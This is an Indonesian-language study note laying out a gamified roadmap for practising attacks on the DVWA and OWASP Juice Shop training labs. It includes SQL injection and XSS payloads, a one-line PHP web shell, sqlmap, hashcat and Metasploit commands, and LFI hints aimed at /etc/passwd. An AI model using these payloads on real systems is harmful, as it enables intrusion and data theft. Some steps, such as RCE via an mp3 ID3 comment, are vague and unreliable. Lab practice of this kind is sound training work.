---
tags: [hacking]
title: Roadmap DVWA dan OWASP Juice
created: '2025-04-07T05:39:25.931Z'
modified: '2025-04-21T10:09:10.242Z'
---

# Roadmap DVWA dan OWASP Juice
Berikut **roadmap eksploitasi DVWA & OWASP Juice Shop** yang menyenangkan dan terstruktur seperti game level-up! 🎮💻

---

### **📌 Level 1: Pemula (Basic Exploitation)**
#### **🎯 Target: DVWA**
1. **SQL Injection (Login Bypass)**
   - **Goal**: Login sebagai admin tanpa password.
   - **Langkah**:
     - Di halaman login, masukkan:
       ```
       Username: admin' -- 
       Password: (kosong)
       ```
     - **Mekanisme**: `--` adalah komentar SQL, mengabaikan password.

2. **XSS (Alert Sederhana)**
   - **Goal**: Munculkan popup "Hacked!" di halaman.
   - **Langkah**:
     - Masukkan script ini di form XSS:
       ```html
       <script>alert("Hacked!")</script>
       ```

3. **File Upload (Shell Sederhana)**
   - **Goal**: Upload file PHP untuk eksekusi command.
   - **Langkah**:
     - Buat file `shell.php` berisi:
       ```php
       <?php system($_GET['cmd']); ?>
       ```
     - Upload, lalu akses: `http://localhost:8080/uploads/shell.php?cmd=id`

---

### **📌 Level 2: Menengah (Advanced Techniques)**
#### **🎯 Target: OWASP Juice Shop**
4. **Admin Account Takeover**
   - **Goal**: Login sebagai admin dengan credential yang dicuri.
   - **Langkah**:
     - Cari email admin di **API** (`http://localhost:3000/rest/user/whoami`).
     - Eksploitasi **JWT Token** di Local Storage.

5. **Database Dump via SQLi**
   - **Goal**: Curi semua data user.
   - **Langkah**:
     - Gunakan input: `' UNION SELECT * FROM Users--` di form pencarian.

6. **RCE via Malicious File**
   - **Goal**: Eksekusi command di server.
   - **Langkah**:
     - Upload file `.mp3` berisi kode JavaScript di komentar ID3.

---

### **📌 Level 3: Expert (Real-World Simulation)**
#### **🎯 Kombinasi DVWA + Juice Shop**
7. **Pivoting Attack**
   - **Goal**: Gunakan akses di DVWA untuk serang Juice Shop.
   - **Langkah**:
     1. Dapatkan shell di DVWA via file upload.
     2. Gunakan `curl` dari DVWA untuk eksploitasi Juice Shop.

8. **Password Cracking**
   - **Goal**: Crack hash password dari database.
   - **Tools**:
     ```bash
     hashcat -m 0 hash.txt rockyou.txt
     ```

9. **CSRF + XSS Chain**
   - **Goal**: Buat admin mengklik link jahat.
   - **Langkah**:
     - Gabungkan XSS di DVWA dengan CSRF di Juice Shop.

---

### **🎮 Challenge Tambahan (Seperti Game Quest)**
| **No** | **Challenge**                | **Hint**                          | **Reward (Konsep Dipelajari)** |
|--------|------------------------------|-----------------------------------|-------------------------------|
| 1      | Hapus semua produk di Juice Shop | Cari endpoint API `/api/Products` | API Security                  |
| 2      | Dapatkan akses `/etc/passwd` di DVWA | Gunakan LFI + Path Traversal     | File System Access            |
| 3      | Deface homepage Juice Shop   | Cari upload vector tersembunyi    | Client-Side Storage           |

---

### **🛠️ Tools Wajib Dicoba**
1. **Burp Suite**: Intercept request di DVWA.
2. **sqlmap**:
   ```bash
   sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=yourcookie"
   ```
3. **Metasploit**:
   ```bash
   use exploit/unix/webapp/dvwa_upload_exec
   ```

---

### **📈 Roadmap Visual**
```
Level 1: Basic (DVWA) → Level 2: Advanced (Juice Shop) → Level 3: Combined Attacks
  │                    │                      │
  ├── SQLi            ├── API Abuse         ├── Pivoting
  ├── XSS             ├── JWT Tampering     ├── Privilege Escalation
  └── File Upload     └── RCE Chains        └── Real-World Scenarios
```

---

### **💡 Tips Seru!**
- **Capture The Flag (CTF)**: Buat flag di `/var/www/flag.txt` dan tantang teman untuk mencurinya.
- **Speedrun Challenge**: Selesaikan semua level dalam waktu <30 menit!
- **Log Serangan**: Gunakan `docker logs dvwa` untuk analisis.

---

Dengan roadmap ini, Anda belajar **seperti bermain game** tapi dengan skill hacking nyata! Setiap level selesai = unlock achievement baru 🏆. Selamat bersenang-senang! 🚀

**P.S.**: Untuk solusi tiap challenge, cek:  
- [DVWA Wiki](https://github.com/digininja/DVWA)  
- [Juice Shop Solutions](https://pwning.owasp-juice.shop/)
